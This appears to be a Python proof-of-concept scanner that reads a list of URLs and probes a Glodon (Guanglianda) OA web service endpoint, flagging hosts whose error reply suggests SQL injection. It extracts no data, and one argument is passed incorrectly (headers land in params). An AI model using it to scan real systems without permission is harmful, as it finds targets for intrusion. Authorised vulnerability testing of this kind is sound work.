from urllib.parse import urljoin

import requests


class GuangOA():
    def __init__(self):
        self.Detection_Url = '/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
        self.headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203'}
    def get_response(self, url, headers, payloads):
        response = requests.get(urljoin(url, payloads), headers,verify=False)
        return response


    def parse(self):
        '''
        判断主函数
        '''
        for url in self.openurls():
            response = self.get_response(url=url, payloads=self.Detection_Url, headers=self.headers)
            if "参数错误" in response.text:
                print(url+"可能存在sql注入")



    def openurls(self):
        '''
        此函数用于读取用户给出的待检测URL地址，并进行处理
        '''
        url = []
        with open('urls.txt', mode='r', encoding='utf8') as f:
            url = []
            ip = f.read().splitlines()
            for i in ip:
                url.append(i)
        return url

    def menu(self):
        print('''
感谢使用观火项目组广联达OA sql注入检测poc，请将待检测url填写到同级目录下的urls.txt文件中
            ''')

    def main(self):
        self.menu()
        self.parse()
        print("检测完毕，感谢使用")


if __name__ == '__main__':
    guanlianda = GuangOA()
    guanlianda.main()
